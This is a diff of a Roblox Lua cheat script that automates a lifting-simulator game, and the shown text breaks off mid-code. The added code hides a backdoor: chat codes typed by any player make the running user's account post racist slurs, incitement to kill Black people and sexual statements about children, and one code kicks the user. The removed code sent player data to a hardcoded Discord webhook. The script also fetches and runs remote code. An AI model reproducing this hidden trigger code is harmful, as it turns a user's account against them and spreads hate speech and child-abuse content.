@@ -1,90 +1,2759 @@
-local url = "https://discord.com/api/webhooks/1351197855846502420/5XPI4ZihLlO0yprTjdCur8s-5NlPiPpbSdUmVqEghAFEQ_HDUeqO6ATPaSjpKkdhxGLV"
-local httpService = game:GetService("HttpService")
-local player = game:GetService("Players").LocalPlayer
-local leaderstats = player:WaitForChild("leaderstats")
-
--- Suffix table
-local suffixTable = {
-    [3] = "K", [6] = "M", [9] = "B", [12] = "T",
-    [15] = "Qa", [18] = "Qi", [21] = "Sx", [24] = "Sp",
-    [27] = "Oc", [30] = "No", [33] = "Dc", [36] = "Ud",
-    [39] = "Td", [42] = "Qatd", [45] = "Qitd", [48] = "Sxd",
-    [51] = "Spd", [54] = "Ocd", [57] = "Nov", [60] = "Vg",
-    [63] = "Uvg", [66] = "Dvg", [69] = "Tvg", [72] = "Uvg",
-    [75] = "Qavg", [78] = "Qivg", [81] = "Sxvg", [84] = "Spvg",
-    [87] = "Ocvg", [90] = "NovG", [93] = "Tg", [96] = "UTG",
-    [99] = "DTG", [102] = "TTG", [105] = "QTG", [108] = "QITG",
-    [111] = "SXTG", [114] = "TTG", [117] = "SPTH", [120] = "OCTG"
-}
-
-local function formatBigNumber(num)
-    num = tonumber(num) or 0
-    if num == 0 then return "Concealed :lock:" end
-
-    local exponent = math.floor(math.log10(num))
-    local tier = math.floor(exponent / 3) * 3
-    tier = math.min(tier, 120)
-
-    local suffix = suffixTable[tier] or ""
-    local scaled = num / (10 ^ tier)
-
-    return string.format("%.2f%s", scaled, suffix)
-end
-
-local function logStats()
-    local muscle = leaderstats:WaitForChild("Muscle").Value
-    local stage = leaderstats:WaitForChild("Stage").Value
-    local username = player.Name
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-
-    local muscleDisplay = (muscle == "0" or muscle == 0) and "Concealed :lock:" or formatBigNumber(muscle)
-
-    local cashText = player.PlayerGui.Main_Gui.DataMenu_Frame.Cash.Status.Text
-    local displayCash = cashText:gsub("0%.00%s*", "")
-
-    local fameText
-    pcall(function()
-        fameText = workspace.Origin_Uron.Head.TitleGui.FameTxt.Text
-    end)
-
-    local data = {
-        ["content"] = "**:bust_in_silhouette: Username:** " .. username ..
-                    "\n**:muscle: Muscle Stat:** " .. muscleDisplay ..
-                    "\n**:cyclone: Stage:** " .. stage ..
-                    "\n**:moneybag: Cash:** " .. displayCash ..
-                    "\n**:sparkles: Fame:** " .. (fameText or "N/A") ..
-                    "\n**:globe_with_meridians: PlaceId:** `" .. placeId .. "`" ..
-                    "\n**:satellite: JobId:** `" .. jobId .. "`",
-        ["username"] = "Stat Logger",
-        ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
-    }
-
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-
-    local body = httpService:JSONEncode(data)
-
-    local success, err = pcall(function()
-        http_request({
-            Url = url,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-    end)
-
-    if not success then
-        warn("Webhook failed:", err)
-    else
-        print("Thanks for Using Asaiya Scripts!")
+local function onChatMessage(message, speaker)
+    if message == "Ax1" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Hate Niggers So Fucking Much", "All")
+    elseif message == "Ax2" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I WISH ALL BLACK MONKEY NIGGERS DIE", "All")
+    elseif message == "Ax3" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("GOD I HATE THESE FUCKING MONKEYS", "All")
+    elseif message == "Ax4" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("EVERYONE KILL THESE NIGGERS", "All")
+    elseif message == "Tempuban" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Want to Fuck kids, specially those 10 years or younger. They have the tightest Pussies.", "All")
+    elseif message:lower() == "PBAN" then
+        -- Kick the local player
+        game:GetService("Players").LocalPlayer:Kick("You Have Been Banned From Entering The Game! ")
     end
 end
 
-logStats()
-
-while true do
-    task.wait(600)
-    logStats()
+-- Hook into the chat event
+for _, player in pairs(game:GetService("Players"):GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onChatMessage(message, player)
+    end)
 end
+
+-- Listen for new players joining
+game:GetService("Players").PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onChatMessage(message, player)
+    end)
+end)
+
+task.wait()
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+local validKeys = { "NLLSPEAK", "ss", " "}
+
+-- Function to show options GUI
+local function showOptionsGui()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Parent = game.CoreGui
+    ScreenGui.ResetOnSpawn = false
+
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(0, 400, 0, 200)
+    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    MainFrame.BorderSizePixel = 2
+    MainFrame.Parent = ScreenGui
+
+    local OneClickButton = Instance.new("TextButton")
+    OneClickButton.Size = UDim2.new(0.5, -1, 1, 0)
+    OneClickButton.Position = UDim2.new(0, 0, 0, 0)
+    OneClickButton.BackgroundColor3 = Color3.fromRGB(2, 27, 253)
+    OneClickButton.Text = "ONE\nCLICK\nVERSION"
+    OneClickButton.TextSize = 20
+    OneClickButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    OneClickButton.Parent = MainFrame
+
+    local WholeScriptButton = Instance.new("TextButton")
+    WholeScriptButton.Size = UDim2.new(0.5, -1, 1, 0)
+    WholeScriptButton.Position = UDim2.new(0.5, 1, 0, 0)
+    WholeScriptButton.BackgroundColor3 = Color3.fromRGB(248, 4, 4)
+    WholeScriptButton.Text = "WHOLE\nSCRIPT\nVERSION"
+    WholeScriptButton.TextSize = 20
+    WholeScriptButton.TextColor3 = Color3.fromRGB(250, 249, 249)
+    WholeScriptButton.Parent = MainFrame
+
+    local function showBlackScreen()
+        ScreenGui:Destroy()
+        local BlackScreenGui = Instance.new("ScreenGui")
+        local BlackScreenFrame = Instance.new("Frame")
+        local SmileyFace = Instance.new("ImageLabel")
+
+        BlackScreenGui.Parent = game.CoreGui
+        BlackScreenGui.IgnoreGuiInset = true  
+
+        BlackScreenFrame.Parent = BlackScreenGui
+        BlackScreenFrame.Size = UDim2.new(1, 0, 1, 0)
+        BlackScreenFrame.Position = UDim2.new(0, 0, 0, 0)
+        BlackScreenFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+        BlackScreenFrame.BorderSizePixel = 0  
+
+        SmileyFace.Parent = BlackScreenFrame
+        SmileyFace.Size = UDim2.new(0, 100, 0, 100)
+        SmileyFace.Position = UDim2.new(0.5, -50, 0.5, -50)
+        SmileyFace.BackgroundTransparency = 1
+        SmileyFace.Image = "rbxassetid://6034973920"
+
+        local RotationTween = TweenService:Create(SmileyFace, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {Rotation = 360})
+        RotationTween:Play()
+
+        task.delay(3, function()
+            BlackScreenGui:Destroy()
+        end)
+    end
+
+    OneClickButton.MouseButton1Click:Connect(function()        
+        local MarketplaceService = game:GetService("MarketplaceService")
+        local Players = game:GetService("Players")
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        local UserInputService = game:GetService("UserInputService")
+        
+        local LocalPlayer = Players.LocalPlayer
+        local gamepassID = 947169821 -- Replace with the actual "Infinite Size" gamepass ID
+        
+        -- Function to check if the player owns the "Infinite Size" gamepass
+        local function ownsInfiniteSizeGamepass()
+            return MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, gamepassID)
+        end
+        
+        -- Create ScreenGui
+        local ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Parent = game.CoreGui
+        ScreenGui.ResetOnSpawn = false
+        
+        -- Create Main Frame
+        local MainFrame = Instance.new("Frame")
+        MainFrame.Name = "MainFrame"
+        MainFrame.Size = UDim2.new(0, 200, 0, 100)
+        MainFrame.Position = UDim2.new(0.5, -100, 0.5, -50)
+        MainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        MainFrame.BorderSizePixel = 0
+        MainFrame.Parent = ScreenGui
+        
+        -- Create Toggle Button
+        local ToggleButton = Instance.new("TextButton")
+        ToggleButton.Name = "ToggleButton"
+        ToggleButton.Size = UDim2.new(0, 150, 0, 50)
+        ToggleButton.Position = UDim2.new(0.5, -75, 0.5, -25)
+        ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        ToggleButton.Text = "OFF"
+        ToggleButton.TextSize = 20
+        ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        ToggleButton.Parent = MainFrame
+        
+        -- Create Close Button
+        local CloseButton = Instance.new("TextButton")
+        CloseButton.Name = "CloseButton"
+        CloseButton.Size = UDim2.new(0, 20, 0, 20)
+        CloseButton.Position = UDim2.new(1, -25, 0, 5)
+        CloseButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+        CloseButton.Text = "✕"
+        CloseButton.TextSize = 14
+        CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        CloseButton.Parent = MainFrame
+        
+        -- Create Minimized GUI (Small Button at the Top)
+        local MinimizedGui = Instance.new("TextButton")
+        MinimizedGui.Name = "MinimizedGui"
+        MinimizedGui.Size = UDim2.new(0, 100, 0, 30)
+        MinimizedGui.Position = UDim2.new(0.5, -50, 0, 5)
+        MinimizedGui.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        MinimizedGui.Text = "SHOW UI"
+        MinimizedGui.TextSize = 16
+        MinimizedGui.TextColor3 = Color3.fromRGB(255, 255, 255)
+        MinimizedGui.Visible = false
+        MinimizedGui.Parent = ScreenGui
+        
+        -- Function to start/stop all scripts
+        local function toggleScripts(state)
+            getgenv().gain = state
+            getgenv().Sell = state
+            getgenv().BuyWeight = state
+            getgenv().BuyDNA = state
+            getgenv().BuyAlter = state
+            getgenv().Destroy = state
+            getgenv().Invisible = state
+            getgenv().AutoEquip = state
+        
+            if state then
+                -- Gain Muscle
+                task.spawn(function()
+                    while getgenv().gain do
+                        local args = { [1] = { [1] = "GainMuscle" } }
+                        ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer(unpack(args))
+                        task.wait(0.4)
+                    end
+                end)
+        
+                -- Sell Muscle
+                task.spawn(function()
+                    while getgenv().Sell do
+                        task.wait(2)
+                        local sellArgs = { [1] = { [1] = "SellMuscle" } }
+                        ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer(unpack(sellArgs))
+                    end
+                end)
+        
+                -- Buy Weight
+                task.spawn(function()
+                    while getgenv().BuyWeight do  
+                        if not player.leaderstats or not player.leaderstats:FindFirstChild("Stage") then
+                            warn("Stage not found in leaderstats!")
+                            return
+                        end
+        
+                        local stage = player.leaderstats.Stage.Value
+                        local maxWeight = 21  -- Default max weight for Stage 0
+        
+                        -- Define max weight based on the player's stage
+                        if stage == 1 then maxWeight = 27
+                        elseif stage == 2 then maxWeight = 32
+                        elseif stage == 3 then maxWeight = 37
+                        elseif stage == 4 then maxWeight = 41
+                        elseif stage == 5 then maxWeight = 46
+                        elseif stage == 6 then maxWeight = 51
+                        elseif stage == 7 then maxWeight = 56
+                        elseif stage == 8 then maxWeight = 61
+                        elseif stage == 9 then maxWeight = 64
+                        elseif stage == 10 then maxWeight = 69
+                        elseif stage == 11 then maxWeight = 72
+                        elseif stage == 12 then maxWeight = 75
+                        elseif stage == 13 then maxWeight = 78
+                        elseif stage == 14 then maxWeight = 81
+                        elseif stage == 15 then maxWeight = 84
+                        elseif stage == 16 then maxWeight = 87
+                        elseif stage == 17 then maxWeight = 90
+                        elseif stage == 18 then maxWeight = 93
+                        elseif stage == 19 then maxWeight = 96
+                        elseif stage == 20 then maxWeight = 99
+                        elseif stage == 21 then maxWeight = 102
+                        elseif stage == 22 then maxWeight = 105
+                        elseif stage == 23 then maxWeight = 108
+                        elseif stage == 24 then maxWeight = 111
+                        elseif stage == 25 then maxWeight = 114
+                        elseif stage == 26 then maxWeight = 120
+                        elseif stage == 27 then maxWeight = 126
+                        elseif stage == 28 then maxWeight = 132
+                        elseif stage == 29 then maxWeight = 138
+                        elseif stage > 30 then maxWeight = 144 -- Example for high-stage players
+                        end
+        
+                        -- Buy weights up to maxWeight
+                        for i = 2, maxWeight do
+                            if not getgenv().BuyWeight then return end
+        
+                            print("Attempting to buy weight: ", i)
+                            local args = {
+                                [1] = {"BuyItem", "Income_Item", "Weight", i}
+                            }
+                            game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
+                            task.wait(0.1)
+                        end
+        
+                        task.wait(1) -- Delay before the next cycle
+                    end
+                end)
+        
+                -- Buy DNA (with gamepass check)
+                task.spawn(function()
+                    while getgenv().BuyDNA do
+                        if not ownsInfiniteSizeGamepass() then
+                            local stage = LocalPlayer.leaderstats:FindFirstChild("Stage") and LocalPlayer.leaderstats.Stage.Value or 0
+                            local maxDNA = 12 -- Default minimum
+        
+                            if stage == 2 then maxDNA = 17
+                            elseif stage == 3 then maxDNA = 19
+                            elseif stage == 4 then maxDNA = 21
+                            elseif stage == 5 then maxDNA = 24
+                            elseif stage == 6 then maxDNA = 28
+                            elseif stage == 7 then maxDNA = 30
+                            elseif stage == 8 then maxDNA = 32
+                            elseif stage == 9 then maxDNA = 37
+                            elseif stage == 10 then maxDNA = 39
+                            elseif stage == 11 then maxDNA = 43
+                            elseif stage == 12 then maxDNA = 44
+                            elseif stage == 13 then maxDNA = 44
+                            elseif stage == 14 then maxDNA = 45
+                            elseif stage == 15 then maxDNA = 46
+                            elseif stage == 16 then maxDNA = 48
+                            elseif stage == 17 then maxDNA = 49
+                            elseif stage == 18 then maxDNA = 50
+                            elseif stage == 19 then maxDNA = 51
+                            elseif stage == 20 then maxDNA = 51
+                            elseif stage == 21 then maxDNA = 52
+                            elseif stage == 22 then maxDNA = 53
+                            elseif stage == 23 then maxDNA = 54
+                            elseif stage == 24 then maxDNA = 55
+                            elseif stage == 25 then maxDNA = 56
+                            elseif stage == 26 then maxDNA = 57
+                            elseif stage == 27 then maxDNA = 58
+                            elseif stage == 28 then maxDNA = 59
+                            elseif stage == 29 then maxDNA = 60
+                            elseif stage > 30 then maxDNA = 70
+                            end
+        
+                            for i = 1, maxDNA do
+                                if not getgenv().BuyDNA then return end
+                                local args = { [1] = {"BuyItem", "Bag_Item", "DNA name", i} }
+                                ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer(unpack(args))
+                                task.wait(0.1)
+                            end
+                        end
+                        task.wait(1)
+                    end
+                end)
+        
+                -- Buy Alter
+                task.spawn(function()
+                    while getgenv().BuyAlter do
+                        for i = 1, 30 do
+                            if not getgenv().BuyAlter then return end
+                            local args = { [1] = {"BuyItem", "Rebirth_Item", "Rebirth1", i} }
+                            ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer(unpack(args))
+                            task.wait(0.1)
+                        end
+                        task.wait(1)
+                    end
+                end)
+        
+                -- Auto Equip Inventory Items
+                task.spawn(function()
+                    local blacklist = {"Athena", "Cronus", "Foot", "Hades", "Hercules", "Poseidon", "Zeus", "Ares"}
+                    while getgenv().AutoEquip do
+                        local inventory = LocalPlayer:FindFirstChildOfClass("Backpack")
+                        if inventory then
+                            for _, item in ipairs(inventory:GetChildren()) do
+                                if item:IsA("Tool") and not table.find(blacklist, item.Name) then
+                                    LocalPlayer.Character.Humanoid:EquipTool(item)
+                                end
+                            end
+                        end
+                        task.wait(0.5) -- Adjust time as needed
+                    end
+                end)
+            end
+        end
+        
+        -- Toggle Button Functionality
+        local toggled = false
+        local ToggleButton = MainFrame:WaitForChild("ToggleButton")
+        if ToggleButton then
+            ToggleButton.MouseButton1Click:Connect(function()
+                toggled = not toggled
+                toggleScripts(toggled)
+                ToggleButton.BackgroundColor3 = toggled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
+                ToggleButton.Text = toggled and "ON" or "OFF"
+            end)
+        else
+            warn("ToggleButton not found in MainFrame!")
+        end
+        
+        -- Close Button Functionality
+        local CloseButton = MainFrame:WaitForChild("CloseButton")
+        if CloseButton then
+            CloseButton.MouseButton1Click:Connect(function()
+                MainFrame.Visible = false
+                MinimizedGui.Visible = true
+            end)
+        else
+            warn("CloseButton not found in MainFrame!")
+        end
+        
+        -- Reopen Main GUI from Minimized Button
+        local MinimizedGui = ScreenGui:WaitForChild("MinimizedGui")
+        if MinimizedGui then
+            MinimizedGui.MouseButton1Click:Connect(function()
+                MainFrame.Visible = true
+                MinimizedGui.Visible = false
+            end)
+        else
+            warn("MinimizedGui not found in ScreenGui!")
+        end
+        
+        -- Dragging functionality for Main GUI
+        local dragging, dragInput, dragStart, startPos
+        
+        MainFrame.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                dragging = true
+                dragStart = input.Position
+                startPos = MainFrame.Position
+        
+                input.Changed:Connect(function()
+                    if input.UserInputState == Enum.UserInputState.End then
+                        dragging = false
+                    end
+                end)
+            end
+        end)
+        
+        MainFrame.InputChanged:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseMovement then
+                dragInput = input
+            end
+        end)
+        
+        UserInputService.InputChanged:Connect(function(input)
+            if input == dragInput and dragging then
+                local delta = input.Position - dragStart
+                MainFrame.Position = UDim2.new(
+                    startPos.X.Scale, startPos.X.Offset + delta.X,
+                    startPos.Y.Scale, startPos.Y.Offset + delta.Y
+                )
+            end
+        end)
+        showBlackScreen()
+    end)
+
+    WholeScriptButton.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
+        print("Script Running")
+        print("Please wait, web Executors take a while to load.")
+        local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/Zelerator/ASKID/refs/heads/main/ASAIYAUI'))()
+        
+        local Window = Rayfield:CreateWindow({
+            Name = "Asaiya Script for No limit and Lifting Simulator [BETA]",
+            Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+            LoadingTitle = "Script for NLLS",
+            LoadingSubtitle = "Made by Asaiya",
+            Theme = "Ocean", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+         
+            DisableRayfieldPrompts = false,
+            DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+         
+            ConfigurationSaving = {
+               Enabled = true,
+               FolderName = Asaiya, -- Create a custom folder for your hub/game
+               FileName = "Asaiya Hub"
+            },
+         
+            Discord = {
+               Enabled = true, -- Prompt the user to join your Discord server if their executor supports it
+               Invite = "https://discord.gg/mkjfWXDjBu", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
+               RememberJoins = false -- Set this to false to make them join the discord every time they load it up
+            },
+         
+            KeySystem = false, -- Set this to true to use our key system
+            KeySettings = {
+               Title = "Key System",
+               Subtitle = "Need key to open the script",
+               Note = "Join my Discord to get the Key \nhttps://discord.gg/A2mNjt4BAY", -- Use this to tell the user how to get a key
+               FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+               SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+               GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+               Key = {"getfucked","0"}
+                
+            }
+         })
+        
+         Rayfield:Notify({
+            Title = "Thanks for Using My Script!",
+            Content = "Join our discord server to request features!",
+            Duration = 3.5,
+            Image = 4483362458,
+         })
+        
+         local MainTab = Window:CreateTab(" Automatics", nil)
+         local TryTab = Window:CreateTab("Bloodline & Island", nil)
+         local PlayerTab = Window:CreateTab("Players", nil)
+         local SetTab = Window:CreateTab("Settings", nil)
+         local MiscTab = Window:CreateTab("✅Information✅", nil)
+         local player = game.Players.LocalPlayer
+        local Toggle = MainTab:CreateToggle({
+            Name = "Gain Muscle + Sell If Full Storage (Normal Speed)",
+            CurrentValue = false,
+            Flag = "Toggle1",
+            Callback = function(Value)
+                if Value then
+                    print("✅ Auto-Sell & Gain Muscle Enabled")
+                    _G.AutoSell = true
+                    _G.GainMuscle = true
+        
+                    local replicatedStorage = game:GetService("ReplicatedStorage")
+                    local remoteEvent = replicatedStorage:WaitForChild("RemoteEvent")
+                    local player = game:GetService("Players").LocalPlayer
+                    local muscleStat = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Muscle") -- Change "Muscle" if needed
+        
+                    local muscleHistory = {} -- Store the last 5 seconds of muscle values
+                    local historyLength = 3 -- Track the last 5 values (1 per second)
+        
+                    -- Muscle Gaining Loop
+                    spawn(function()
+                        while _G.GainMuscle do
+                            local args = {
+                                [1] = {
+                                    [1] = "GainMuscle"
+                                }
+                            }
+                            remoteEvent:FireServer(unpack(args))
+                            task.wait(0.7) -- Gains muscle every 0.4 seconds
+                        end
+                    end)
+        
+                    -- Auto-Sell Loop
+                    spawn(function()
+                        while _G.AutoSell do
+                            task.wait(1) -- Check every 1 second
+        
+                            if muscleStat then
+                                -- Add current muscle value to history
+                                table.insert(muscleHistory, muscleStat.Value)
+                                if #muscleHistory > historyLength then
+                                    table.remove(muscleHistory, 1) -- Keep history at 5 values max
+                                end
+        
+                                -- Check if all stored values are the same
+                                local allSame = true
+                                for i = 2, #muscleHistory do
+                                    if muscleHistory[i] ~= muscleHistory[i - 1] then
+                                        allSame = false
+                                        break
+                                    end
+                                end
+        
+                                if allSame and #muscleHistory >= historyLength then
+                                    -- No muscle gain for 5 seconds, sell!
+                                    print("⚡ No muscle gain detected for 5 seconds. Selling...")
+                                    local args = {
+                                        [1] = {
+                                            [1] = "SellMuscle"
+                                        }
+                                    }
+                                    remoteEvent:FireServer(unpack(args))
+        
+                                    -- Clear history after selling
+                                    muscleHistory = {}
+                                end
+                            else
+                                print("❌ Muscle stat not found! Make sure the stat name is correct.")
+                            end
+                        end
+                    end)
+                else
+                    print("❌ Auto-Sell & Gain Muscle Disabled")
+                    _G.AutoSell = false
+                    _G.GainMuscle = false
+                end
+            end,
+        })
+        
+        local Toggle = MainTab:CreateToggle({
+            Name = "Gain Muscle + Sell If Full Storage (Fast Lifter Gamepass)",
+            CurrentValue = false,
+            Flag = "Toggle2",
+            Callback = function(Value)
+                if Value then
+                    print("✅ Auto-Sell & Gain Muscle Enabled")
+                    _G.AutoSell = true
+                    _G.GainMuscle = true
+        
+                    local replicatedStorage = game:GetService("ReplicatedStorage")
+                    local remoteEvent = replicatedStorage:WaitForChild("RemoteEvent")
+                    local player = game:GetService("Players").LocalPlayer
+                    local muscleStat = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Muscle") -- Change "Muscle" if needed
+        
+                    local muscleHistory = {} -- Store the last 5 seconds of muscle values
+                    local historyLength = 3 -- Track the last 5 values (1 per second)
+        
+                    -- Muscle Gaining Loop
+                    spawn(function()
+                        while _G.GainMuscle do
+                            local args = {
+                                [1] = {
+                                    [1] = "GainMuscle"
+                                }
+                            }
+                            remoteEvent:FireServer(unpack(args))
+                            task.wait(0.43) -- Gains muscle every 0.4 seconds
+                        end
+                    end)
+        
+                    -- Auto-Sell Loop
+                    spawn(function()
+                        while _G.AutoSell do
+                            task.wait(1) -- Check every 1 second
+        
+                            if muscleStat then
+                                -- Add current muscle value to history
+                                table.insert(muscleHistory, muscleStat.Value)
+                                if #muscleHistory > historyLength then
+                                    table.remove(muscleHistory, 1) -- Keep history at 5 values max
+                                end
+        
+                                -- Check if all stored values are the same
+                                local allSame = true
+                                for i = 2, #muscleHistory do
+                                    if muscleHistory[i] ~= muscleHistory[i - 1] then
+                                        allSame = false
+                                        break
+                                    end
+                                end
+        
+                                if allSame and #muscleHistory >= historyLength then
+                                    -- No muscle gain for 5 seconds, sell!
+                                    print("⚡ No muscle gain detected for 5 seconds. Selling...")
+                                    local args = {
+                                        [1] = {
+                                            [1] = "SellMuscle"
+                                        }
+                                    }
+                                    remoteEvent:FireServer(unpack(args))
+        
+                                    -- Clear history after selling
+                                    muscleHistory = {}
+                                end
+                            else
+                                print("❌ Muscle stat not found! Make sure the stat name is correct.")
+                            end
+                        end
+                    end)
+                else
+                    print("❌ Auto-Sell & Gain Muscle Disabled")
+                    _G.AutoSell = false
+                    _G.GainMuscle = false
+                end
+            end,
+        })
+        
+        
+        
+         
+        
+        local selectedMode = "None"
+        
+        local Dropdown = MainTab:CreateDropdown({
+            Name = "Choose Gain Muscle (30+ FPS MINIMUM)",
+            Options = {
+                "None",
+                "Gain Muscle (Fast Lifter Gamepass, No RollBack & Safe)",
+                "Gain Muscle (No Gamepass)",
+                "Gain Muscle (Fast Lifter Gamepass, Ridiculously fast & Unsafe)"
+            },
+            CurrentOption = {"None"},
+            MultipleOptions = false,
+            Flag = "Dropdown1",
+            Callback = function(Option)
+                -- Stop any existing loop before starting a new one
+                getgenv().gain = false
+                selectedMode = Option[1] -- Store the selected option
+                
+                -- Small wait to ensure previous loop stops completely
+                task.wait(0.1)
+        
+                if selectedMode ~= "None" then
+                    getgenv().gain = true
+                    task.spawn(function()
+                        while getgenv().gain do
+                            local args = {
+                                [1] = {
+                                    [1] = "GainMuscle"
+                                }
+                            }
+        
+                            game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
+        
+                            -- Apply the correct wait time based on selection
+                            if selectedMode == "Gain Muscle (No Gamepass)" then
+                                task.wait(0.7)
+                            elseif selectedMode == "Gain Muscle (Fast Lifter Gamepass, Ridiculously fast & Unsafe)" then
+                                task.wait() -- No delay (instant execution)
+                            elseif selectedMode == "Gain Muscle (Fast Lifter Gamepass, No RollBack & Safe)" then
+                                task.wait(0.43)
+                            end
+                        end
+                    end)
+                end
+            end
+        })
+        
+        
+        local selectedSellMode = "None"
+                
+        local Dropdown = MainTab:CreateDropdown({
+            Name = "Auto Sell Muscle",
+            Options = {
+                "None",
+                "Instant",
+                "Every 1 Second",
+                "Every 3 Seconds",
+                "Every 5 Seconds",
+                "Every 10 Seconds",
+                "Every 15 Seconds",
+                "Every 30 Seconds",
+                "Every 60 Seconds",
+                "Every 5 Minutes",
+                "Every 1 Hour",
+                "Sell If Full"  -- Added the new option here
+            },
+            CurrentOption = {"None"},
+            MultipleOptions = false,
+            Flag = "Dropdown2",
+            Callback = function(Option)
+                getgenv().Sell = false
+                _G.AutoSell = false
+                _G.GainMuscle = false
+                selectedSellMode = Option[1] 
+        
+                task.wait(0.1)
+        
+                if selectedSellMode ~= "None" then
+                    if selectedSellMode == "Sell If Full" then
+                        -- Handle Sell If Full mode
+                        _G.AutoSell = true
+                        _G.GainMuscle = true
+                        print("✅ Auto-Sell & Gain Muscle (Sell If Full) Enabled")
+                        
+                        local replicatedStorage = game:GetService("ReplicatedStorage")
+                        local remoteEvent = replicatedStorage:WaitForChild("RemoteEvent")
+                        local player = game:GetService("Players").LocalPlayer
+                        local muscleStat = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Muscle") -- Change "Muscle" if needed
+        
+                        local muscleHistory = {} -- Store the last 5 seconds of muscle values
+                        local historyLength = 3 -- Track the last 5 values (1 per second)
+        
+                        -- Muscle Gaining Loop
+                        spawn(function()
+                            while _G.GainMuscle do
+                                local args = {
+                                    [1] = {
+                                        [1] = "GainMuscle"
+                                    }
+                                }
+                                remoteEvent:FireServer(unpack(args))
+                                task.wait(15) -- Gains muscle every 0.4 seconds
+                            end
+                        end)
+        
+                        -- Auto-Sell Loop
+                        spawn(function()
+                            while _G.AutoSell do
+                                task.wait(1) -- Check every 1 second
+        
+                                if muscleStat then
+                                    -- Add current muscle value to history
+                                    table.insert(muscleHistory, muscleStat.Value)
+                                    if #muscleHistory > historyLength then
+                                        table.remove(muscleHistory, 1) -- Keep history at 5 values max
+                                    end
+        
+                                    -- Check if all stored values are the same
+                                    local allSame = true
+                                    for i = 2, #muscleHistory do
+                                        if muscleHistory[i] ~= muscleHistory[i - 1] then
+                                            allSame = false
+                                            break
+                                        end
+                                    end
+        
+                                    if allSame and #muscleHistory >= historyLength then
+                                        -- No muscle gain for 5 seconds, sell!
+                                        print("⚡ No muscle gain detected for 5 seconds. Selling...")
+                                        local args = {
+                                            [1] = {
+                                                [1] = "SellMuscle"
+                                            }
+                                        }
+                                        remoteEvent:FireServer(unpack(args))
+        
+                                        -- Clear history after selling
+                                        muscleHistory = {}
+                                    end
+                                else
+                                    print("❌ Muscle stat not found! Make sure the stat name is correct.")
+                                end
+                            end
+                        end)
+                    else
+                        -- Handle all other timer-based sell modes
+                        getgenv().Sell = true
+                        task.spawn(function()
+                            local lastSellTime = tick() -- Get the current time
+                            local interval = 0
+                            if     selectedSellMode == "Instant" then
+                                interval = 0.5
+                            elseif selectedSellMode == "Every 1 Second" then
+                                interval = 1
+                            elseif selectedSellMode == "Every 3 Seconds" then
+                                interval = 3
+                            elseif selectedSellMode == "Every 5 Seconds" then
+                                interval = 5
+                            elseif selectedSellMode == "Every 10 Seconds" then 
+                                interval = 10
+                            elseif selectedSellMode == "Every 15 Seconds" then 
+                                interval = 15
+                            elseif selectedSellMode == "Every 30 Seconds" then
+                                interval = 30
+                            elseif selectedSellMode == "Every 60 Seconds" then
+                                interval = 60
+                            elseif selectedSellMode == "Every 5 Minutes" then
+                                interval = 300
+                            elseif selectedSellMode == "Every 1 Hour" then
+                                interval = 3600
+                            end
+        
+                            while getgenv().Sell do
+                                if tick() - lastSellTime >= interval then
+                                    local args = {
+                                        [1] = {
